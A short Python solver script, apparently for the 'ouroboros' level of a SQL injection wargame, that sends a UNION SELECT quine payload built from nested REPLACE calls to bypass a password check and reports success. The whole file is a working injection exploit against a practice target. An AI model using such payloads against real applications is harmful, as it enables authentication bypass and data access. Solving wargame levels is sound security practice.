import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/ouroboros_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

res = requests.get(url, params={'pw': 
'\'union SELECT REPLACE(REPLACE(\'"union SELECT '
'REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS '
'Quine#\',CHAR(34),CHAR(39)),CHAR(36),\'"union SELECT '
'REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#\') AS Quine#'
},cookies=cookie)

if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")

